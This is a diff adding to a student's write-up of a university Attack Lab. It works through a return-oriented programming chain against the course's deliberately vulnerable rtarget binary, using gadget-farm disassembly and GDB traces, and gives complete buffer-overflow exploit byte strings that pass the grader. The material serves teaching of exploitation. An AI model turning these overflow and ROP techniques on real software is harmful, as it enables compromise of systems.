@@ -33,8 +33,6 @@ Can also be used while running `GDB`
 (gdb) run -q < exploit.bin
 ```
 
-## Notes
-
 - `ctarget` and `rtarget` must be run using the `-q` option so that they don't try to contact the grading server.
 
 ## Phase 1 (`ctarget`)
@@ -651,4 +649,176 @@ PASS: Would have posted the following:
         course  15213-f15
         lab     attacklab
         result  1:PASS:0xffffffff:ctarget:3:48 B8 35 39 62 39 39 37 66 61 48 C7 C7 B0 DC 61 55 48 89 07 C7 47 08 00 00 00 00 68 FA 18 40 00 C3 90 90 90 90 90 90 90 78 DC 61 55
+```
+
+## Phase 4 (`rtarget`)
+
+This phase will repeat the attack of Phase 2, but do so on program RTARGET using gadgets from the gadget farm (`farm.c`)
+
+- Can be done with just two gadgets
+- Use only first 8 registers `rax` - `rdi`
+- Use only instructions `movq`, `popq`, `ret`, `nop` (see labsheet for encodings)
+- `When a gadget uses a popq instruction, it will pop data from the stack. As a result, your exploit string will contain a combination of gadget addresses and data.`
+
+- So need to overwrite the return address from `getbuf` like in Phase1, but instead of to `touch1` to some gadget
+- This will pop form the stack and decrement `rsp`
+- Can we then place gadget addresses and data above the return address, so that `rsp` is now pointing at them
+- The gadgets will push/pop from them as the execute instructions and return
+- The second (final) gadget should have `rsp` point at the address of `phase2` when it calls `ret`
+
+- [padding] [gadget address] [gadget addresses / data]
+- `[00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00] [?? ?? ?? ??] [???]`
+
+- Want something to the effect of
+
+```asm
+popq    %rdi    # rsp pointing to cookie value
+ret             # rsp pointing to touch2
+```
+
+```asm
+0000000000000000 <.text>:
+   0:	5f                   	pop    %rdi
+   1:	c3                   	ret
+```
+
+- Can search the end of gadgets for `5f c3`?
+- Nope no `5f` in the farm
+- What about moving something into `rdi`?
+
+```asm
+movq    %rax, %rdi
+movq    %rcx, %rdi
+movq    %rdx, %rdi
+movq    %rbx, %rdi
+movq    %rsp, %rdi
+movq    %rbp, %rdi
+movq    %rsi, %rdi
+```
+
+```asm
+0000000000000000 <.text>:
+   0:	48 89 c7             	mov    %rax,%rdi
+   3:	48 89 cf             	mov    %rcx,%rdi
+   6:	48 89 d7             	mov    %rdx,%rdi
+   9:	48 89 df             	mov    %rbx,%rdi
+   c:	48 89 e7             	mov    %rsp,%rdi
+   f:	48 89 ef             	mov    %rbp,%rdi
+  12:	48 89 f7             	mov    %rsi,%rdi
+```
+
+- Look for `48 89 xx` in gadget farm
+
+```asm
+00000000004019a0 <addval_273>:
+  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
+  4019a6:	c3
+  # [48 89 c7 c3] -> [movq %rax, %rdi] [ret]
+
+...
+
+00000000004019c3 <setval_426>:
+  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
+  4019c9:	c3
+  # [48 89 c7 90 c3] -> [movq %rax, %rdi] [nop] [ret]
+```
+
+- So can we find `popq %rax` right before a `ret`, so we can then run the `movq %rax, %rdi` gadget?
+
+```asm
+0000000000000000 <.text>:
+   0:	58                   	pop    %rax
+   1:	c3                   	ret
+```
+
+- Look for `58 c3`
+
+```asm
+00000000004019a7 <addval_219>:
+  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
+  4019ad:	c3                   	ret
+  # [58 90 c3] -> [popq %rax] [nop] [ret]
+
+...
+
+00000000004019ca <getval_280>:
+  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
+  4019cf:	c3
+  # [58 90 c3] -> [popq %rax] [nop] [ret]
+```
+
+- So trying to do
+
+```asm
+popq    %rax        # move cookie into rax, decrement rsp
+ret                 # pop address of next gadget into rip
+movq    %rax, %rdi  # move cookie into rdi
+ret                 # pop address of touch2 into rip
+```
+
+- So the return address in `getbuf` needs to be set to the byte of the `popq` instruction in one of the gadgets
+- `0x4019cc` (`getval_280`)
+
+- Lets just try that out first to see if the `gbd` TUI can show the instructions being interpreted correctly
+- `[00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00] [cc 19 40]`
+
+```shell
+(gdb) break getbuf
+Breakpoint 1 at 0x4017a8: file buf.c, line 12.
+(gdb) run -qi phase4.exploit.bin
+Breakpoint 1, getbuf () at buf.c:12
+(gdb) x/6i $rip
+=> 0x4017a8 <getbuf>:   sub    $0x28,%rsp
+   0x4017ac <getbuf+4>: mov    %rsp,%rdi
+   0x4017af <getbuf+7>: call   0x401b60 <Gets>
+   0x4017b4 <getbuf+12>:        mov    $0x1,%eax
+   0x4017b9 <getbuf+17>:        add    $0x28,%rsp
+   0x4017bd <getbuf+21>:        ret
+(gdb) nexti
+14      in buf.c
+(gdb)
+0x00000000004017af      14      in buf.c
+(gdb)
+16      in buf.c
+(gdb)
+0x00000000004017b9      16      in buf.c
+(gdb)
+0x00000000004017bd      16      in buf.c
+(gdb) x/6i $rip
+=> 0x4017bd <getbuf+21>:        ret
+   0x4017be:    nop
+   0x4017bf:    nop
+   0x4017c0 <touch1>:   sub    $0x8,%rsp
+   0x4017c4 <touch1+4>: movl   $0x1,0x203d0e(%rip)        # 0x6054dc <vlevel>
+   0x4017ce <touch1+14>:        mov    $0x4031e5,%edi
+(gdb) x/6gx $rsp
+0x7ffffffaf678: 0x00000000004019cc      0x0000000000000009
+0x7ffffffaf688: 0x0000000000402044      0xf4f4f4f4f4f4f4f4
+0x7ffffffaf698: 0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
+(gdb) nexti
+0x00000000004019cc in getval_280 ()
+(gdb) x/3i $rip
+=> 0x4019cc <getval_280+2>:     pop    %rax
+   0x4019cd <getval_280+3>:     nop
+   0x4019ce <getval_280+4>:     ret
+(gdb)
+```
+
+- Yep, so looks like we can make these instructions being run...
+- Now to add the required addresses/data to the exploit input
+- Need to explicitly pad the initial `getbuf` return address with zeros to maintain its value
+
+- [padding] [gadget 1 address] [cookie value] [gadget 2 address] [touch2 address]
+- `[00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00] [cc 19 40 00 00 00 00 00] [fa 97 b9 59 00 00 00 00] [a2 19 40 00 00 00 00 00] [ec 17 40 00 00 00 00 00]`
+
+```shell
+🐳 ❯ ./rtarget -qi phase4.exploit.bin
+Cookie: 0x59b997fa
+Touch2!: You called touch2(0x59b997fa)
+Valid solution for level 2 with target rtarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 CC 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00
 ```
